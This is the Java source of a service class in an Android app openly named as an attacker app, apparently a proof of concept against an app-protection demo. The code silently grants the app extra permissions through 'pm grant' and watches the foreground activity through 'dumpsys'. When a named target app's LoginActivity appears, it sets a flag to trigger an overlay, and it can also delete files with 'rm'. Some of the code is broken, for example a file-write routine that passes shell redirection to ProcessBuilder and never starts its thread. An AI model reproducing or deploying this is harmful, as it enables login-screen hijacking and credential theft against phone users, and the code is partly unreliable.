package com.example.attackerappjava;

import android.content.Context;
import android.util.Log;

import androidx.annotation.Keep;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class UserService extends IUserService.Stub {
    AtomicBoolean flag = new AtomicBoolean(false);
    public UserService() {
        Log.i("UserService", "constructor");
    }

    @Keep
    public UserService(Context context) {
        Log.i("UserService", "constructor with Context: context=" + context.toString());
    }

    private static final String TAG = "UserService";

    @Override
    public void gatherPermission(String permission) {
        String pkg = "com.example.attackerappjava";
        Log.d(TAG, "Executing command: sh -c pm grant com.example.attackerappjava android.permission." + permission);
        new Thread(() -> {
            ArrayList<String> output = new ArrayList<>();
            Process process = null;

            if (permission == null || permission.trim().isEmpty()) {
                output.add("Error: Path cannot be null or empty.");
                return;
            }
            try {
                process = new ProcessBuilder("pm", "grant", pkg, "android.permission." + permission).start();
                int exitCode = process.waitFor();
                Log.d(TAG, "Command exited with code: " + exitCode);

                if (exitCode != 0) {
                    output.add("--- ERROR STREAM ---");
                }
            } catch (Exception err) {
                Log.e(TAG, "Failed to execute command!!", err);
                output.add("Error: " + err.getMessage());
            } finally {
                if (process != null) {
                    process.destroy();
                }
            }
        }).start();
    }

    public boolean triggerOverlay() {
//        Log.d(TAG, "Running...");
        if(!flag.get()) {
            Thread thread = new Thread(() -> {
                Process process = null;
                BufferedReader reader = null;
                Pattern pattern = Pattern.compile("topResumedActivity=ActivityRecord\\{.*? (\\S+)/(\\S+) t\\d+\\}");
                try {
                    process = new ProcessBuilder("dumpsys", "activity", "activities").start();
                    reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        Matcher matcher = pattern.matcher(line);
                        if (matcher.find()) {
                            Log.d(TAG, matcher.group(1));
                            Log.d(TAG, matcher.group(2));
                            if (Objects.equals(matcher.group(1), "com.aheaditec.talsec.demoapp") && Objects.equals(matcher.group(2), ".LoginActivity")) {
                                Log.d(TAG, "The trigger overlay should be triggered now...");
                                flag.set(true);
                                Log.d(TAG, "Atomic value written to true");
                                Thread.sleep(3000);
                                break;
                            }
                        }
                    }
                    reader.close();
                    reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                    while ((line = reader.readLine()) != null) {
                        Log.e(TAG, "Command Error: " + line);
                    }
                    reader.close();
                    int exitCode = process.waitFor();
                    Log.d(TAG, "Command exited with code: " + exitCode);
                } catch (Exception err) {
                    Log.e(TAG, "Failed to execute command!!", err);
                } finally {
                    if (process != null) {
                        process.destroy();
                    }
                }
                Log.d(TAG, "The triggerable victim activity is not found...");
            });
            thread.start();
            try {
                thread.join();
            } catch (Exception ignored) {
            }
        }
        Log.d(TAG, String.valueOf(flag.get()));
        return flag.get();
    }

    public void writeToFile(String fileName, String content) {
        Log.d(TAG, "Writing to file...");
        Thread thread = new Thread(()-> {
            Process process = null;
            BufferedReader reader = null;
            try {
                process = new ProcessBuilder("echo ", content, " >> ", fileName).start();
                int exitCode = process.waitFor();
                Log.d(TAG, "Command exited with code: " + exitCode);
            } catch (Exception ignored) {
            }
        });
        try {
            thread.join();
        } catch (Exception ignored) {
        }
    }

    public void deleteFile(String filePath) {
        Process process = null;
        BufferedReader reader = null;
        try {
            process = new ProcessBuilder("rm", filePath).start();
            int exitCode = process.waitFor();
            Log.d(TAG, "Command exited with code: " + exitCode);
        } catch (Exception ignored) {
        }
    }
}